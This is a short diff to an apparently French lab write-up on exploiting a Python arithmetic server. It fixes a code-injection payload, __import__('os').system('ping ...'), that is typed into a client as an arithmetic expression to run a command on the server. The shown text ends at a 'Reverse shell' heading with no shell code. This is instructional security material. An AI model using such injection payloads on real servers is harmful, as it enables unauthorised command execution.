@@ -105,7 +105,7 @@ Nous pouvons maintenant essayer d'envoyer une commande au serveur pour qu'il pui
 
 ```
 $ sudo python3 client.py
-Veuillez saisir une opération arithmétique : __import__('os').system('ping -c 10.33.70.30')
+Veuillez saisir une opération arithmétique : __import__('os').system('ping -c 1 10.33.70.30')
 ```
 
 ## 3. Reverse shell
